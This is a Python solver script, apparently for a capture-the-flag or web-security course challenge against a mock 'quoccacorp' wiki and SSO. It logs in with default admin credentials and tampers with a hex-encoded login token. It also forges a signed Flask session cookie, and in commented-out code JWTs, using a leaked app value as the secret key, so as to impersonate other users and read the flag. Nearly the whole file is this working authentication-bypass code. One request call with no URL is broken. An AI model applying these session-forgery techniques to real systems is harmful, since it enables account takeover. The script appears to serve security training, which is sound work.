import sys
from pathlib import Path
sys.path.append(str(Path(__file__).resolve().parent.parent))
from utils import get_session, find_flag

from bs4 import BeautifulSoup
import jwt
from flask import Flask
from flask.sessions import SecureCookieSessionInterface

BASE_URL = "https://easywiki.quoccacorp.com"
SSO_URL = "https://quoccaid.quoccacorp.com"

class Solver:
    def __init__(self):
        self.session = get_session()

    def _get_usernames(self) -> list[str]:
        response = self.session.get(f"{SSO_URL}/users")
        soup = BeautifulSoup(response.text, "html.parser")
        return [user.text for user in soup.find_all('td')]

    def main(self):
        response = self.session.get(BASE_URL)

        soup = BeautifulSoup(response.text, "html.parser")
        form_element = soup.find("form")
        sso_login_url = form_element["action"]
        app_value = form_element.find("input", {"name": "app"})["value"]

        response = self.session.post(sso_login_url,
                                     params={"app": app_value},
                                     data={"user": "admin", "password": "admin"},
                                     allow_redirects=False)
        redirect_url = response.headers.get("Location")
        easywiki_token = redirect_url.split("token=")[-1]
        easywiki_token_decoded = bytes.fromhex(easywiki_token)
        print("TrashPanda".encode().hex())
        print(easywiki_token)
        new_token = easywiki_token.replace("61646d696e2b2b2b2b2b", "TrashPanda".encode().hex())
        print(new_token)
        print(len(easywiki_token_decoded))
        print(easywiki_token_decoded)
        print(self._get_usernames())
        response = self.session.get()

        app = Flask(__name__)
        app.secret_key = app_value
        serializer = SecureCookieSessionInterface().get_signing_serializer(app)
        signed_flask_token = serializer.dumps({"user": "TrashPanda"})
        self.session.cookies.clear()
        self.session.cookies.set("session", signed_flask_token)
        response = self.session.get(BASE_URL)
        print(response.text)
        find_flag(response.text)


        # original_jwt = self.session.cookies.get_dict().get("session")
        # jwt_payload_data: dict = jwt.decode(jwt=original_jwt, key=app_value, algorithms=["HS256"])

        # for user in self._get_usernames():
        #     jwt_payload_data["user"] = user
        #     print(jwt_payload_data)
        #     new_jwt = jwt.encode(payload=jwt_payload_data, key=app_value, algorithm="HS256")
        #     print(f"{new_jwt = }")
        #     self.session.cookies.clear()
        #     self.session.cookies.set("session", new_jwt)

        #     response = self.session.get(SSO_URL)
        #     print(response.text)

if __name__ == "__main__":
    Solver().main()